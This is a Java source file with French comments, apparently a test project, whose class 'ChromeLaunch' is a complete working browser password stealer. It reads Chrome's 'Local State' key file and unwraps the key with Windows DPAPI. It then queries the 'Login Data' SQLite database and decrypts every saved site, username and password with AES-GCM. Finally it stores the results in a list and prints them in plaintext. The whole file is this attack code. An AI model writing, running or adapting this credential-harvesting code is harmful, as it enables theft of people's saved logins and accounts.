package montest;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.sun.jna.platform.win32.Crypt32;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.Win32Exception;
import com.sun.jna.ptr.PointerByReference;
import com.sun.jna.platform.win32.WinCrypt.DATA_BLOB;
import java.io.FileReader;
import java.nio.file.Paths;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;


import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class ChromeLaunch {

	// AES-GCM parameters
	private static final String AES_GCM = "AES/GCM/NoPadding";
	private static final int GCM_IV_LENGTH = 12; // 12-byte IV for GCM
	private static final int GCM_TAG_LENGTH = 16; // 16-byte Authentication Tag (128 bits)
	//conteneur de données decryptées
	 protected  ArrayList<DecryptedData> listeDonnée=new ArrayList<DecryptedData>();

	

	public ChromeLaunch() {
		
	}
	public static void main(String[] args) {
		ChromeLaunch f= new ChromeLaunch();
		try {
			f.encrypted_data_retreive_and_decryptChrome();
		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	public  ArrayList<DecryptedData> getListeDonnee() {
		return listeDonnée;
	}
	public  void encrypted_data_retreive_and_decryptChrome() throws SQLException {
		// recuperation du nom d'utilisateur de la machine
		String username1 = System.getProperty("user.name");
		// decrypted aeskey
		byte[] decryptedKey = keyfileDecription(username1);
		// chemin d'accession au fichier contenant les donnees. data base
		String dbPath = "C:/Users/" + username1 + "/AppData/Local/Google/Chrome/User Data/Default/Login Data";

		// Connection string pour la base de donnees SQLite
		String url = "jdbc:sqlite:" + dbPath;
		// requete pour acceder aux donneées souhaitées. (les mots de passe sont
		// encryptés.)
		String query = "SELECT origin_url, username_value, password_value FROM logins";

		try (Connection conn = DriverManager.getConnection(url + "?busy_timeout=3000");
				Statement stmt = conn.createStatement();
				// resultat de la requete
				ResultSet rs = stmt.executeQuery(query)) {
			while (rs.next()) {
				String urlSite = rs.getString("origin_url");
				String username = rs.getString("username_value");
				byte[] password = rs.getBytes("password_value"); // The encrypted password

				// decryptage du mot de passe:
				String decodedPassword = decrypted_Datav10_v11(password, decryptedKey);
				  //stockage des données
                DecryptedData data= new DecryptedData(urlSite, username,decodedPassword);
                listeDonnée.add(data);
				System.out.println("Site: " + urlSite);
				System.out.println("Username: " + username);
				System.out.println("Decrypted Password: " + decodedPassword);
				System.out.println("-------------------------------");
			}

			// fermer les resources
			rs.close();
			stmt.close();
			conn.close();
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

	/**
	 * decrypte les donnees enn utilisant DPAPI (CryptProtectData) via
	 * CryptUnprotectData
	 * 
	 * @param encryptedData tableau d'octets de la valeur encrypté
	 * @param entropy       tableau de byte d'information additionnelle.
	 * @return tableau d'octets de la valeur decryptée
	 */
	public static byte[] decryptDPAPI(byte[] encryptedData, byte[] entropy) {
		DATA_BLOB encryptedBlob = new DATA_BLOB(encryptedData); // DATA_BLOB contenant la valeur encryté
		PointerByReference pDescrOut = new PointerByReference();// Optionelle description (pas utile ici)
		DATA_BLOB decryptedBlob = new DATA_BLOB(); // la DATA_BLOB decrypté
		DATA_BLOB pEntropy = (entropy == null) ? null : new DATA_BLOB(entropy); // Optionelle entropy (additionelle
																				// données d'encryption )

		boolean result = Crypt32.INSTANCE.CryptUnprotectData(encryptedBlob, pDescrOut, pEntropy, null, null, 0, // new
																												// DWORD(0),
				decryptedBlob);

		if (!result) {
			throw new Win32Exception(Kernel32.INSTANCE.GetLastError());
		}

		// Extraction de la donnees decryté
		byte[] decryptedData = decryptedBlob.getData();

		// liberation de la memoire alloué par Crypt32 pour la donnée decrypté
		Kernel32.INSTANCE.LocalFree(decryptedBlob.pbData);

		return decryptedData;
	}

	public static String decrypted_Datav10_v11(byte[] encryptedPassword, byte[] aeskey) {
		String decryptedValue = "";

		if (new String(encryptedPassword, 0, 3).equals("v10") || new String(encryptedPassword, 0, 3).equals("v11")) {
			// Retirer le préfixe 'v10'
			byte[] encryptedPasswordWithoutVersion = Arrays.copyOfRange(encryptedPassword, 3, encryptedPassword.length);

			// Étape 3 : Extraire IV et texte chiffré
			byte[] iv = Arrays.copyOfRange(encryptedPasswordWithoutVersion, 0, GCM_IV_LENGTH); // IV de 12 octets
			byte[] ciphertextAndTag = Arrays.copyOfRange(encryptedPasswordWithoutVersion, GCM_IV_LENGTH,
					encryptedPasswordWithoutVersion.length);

			// Preparer le AES-GCM cipher pour le decryptage
			Cipher cipher;
			try {
				cipher = Cipher.getInstance(AES_GCM);

				SecretKeySpec secretKey = new SecretKeySpec(aeskey, "AES");
				GCMParameterSpec gcmSpec = new GCMParameterSpec(GCM_TAG_LENGTH * 8, iv); // 16-byte GCM tag (128 bits)

				cipher.init(Cipher.DECRYPT_MODE, secretKey, gcmSpec);

				// Decrypt password
				byte[] decryptedPasswordBytes;
				decryptedPasswordBytes = cipher.doFinal(ciphertextAndTag);
				decryptedValue = new String(decryptedPasswordBytes); // Convertir en String
			} catch (NoSuchAlgorithmException | NoSuchPaddingException e) {
				e.printStackTrace();
			} catch (InvalidKeyException | InvalidAlgorithmParameterException e) {
				e.printStackTrace();
			} catch (IllegalBlockSizeException | BadPaddingException e) {
				e.printStackTrace();
			}
		} else {
			////////////////////////////////// just a raw dpapi decryption
			decryptedValue = new String(decryptDPAPI(encryptedPassword, null));
		}
		return decryptedValue;
	}

	/**
	 * recupeere le fichier json , extrait la clé et la decrypte.
	 * 
	 * @return la clé decrytée en tableau de byte
	 */
	public static byte[] keyfileDecription(String username) {

		byte[] finaldecrypted_key = null;
		try {
			// chemin d'acces au fichier Json
			String localStatePath = Paths.get(

					"C:", "Users", username, "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
					.toString();

			// Parse the Local State JSON file
			JsonObject jsonObject = JsonParser.parseReader(new FileReader(localStatePath)).getAsJsonObject();

			// extrait la cle encrypté (en Base64) de la section "os_crypt"
			JsonObject osCrypt = jsonObject.getAsJsonObject("os_crypt");
			String encryptedKeyBase64 = osCrypt.get("encrypted_key").getAsString();

			// decodage de la base64
			byte[] encryptedKeyBytes = Base64.getDecoder().decode(encryptedKeyBase64);

			// on retire les 5 premier octets qui representent DPAPI avant de decrypter
			byte[] keyBytesWithoutPrefix = new byte[encryptedKeyBytes.length - 5];
			System.arraycopy(encryptedKeyBytes, 5, keyBytesWithoutPrefix, 0, encryptedKeyBytes.length - 5);

			// clé décryptée
			finaldecrypted_key = decryptDPAPI(keyBytesWithoutPrefix, null);

		} catch (Exception e) {
			e.printStackTrace();
		}
		// retourne la cle decryptée
		return finaldecrypted_key;
	}
}
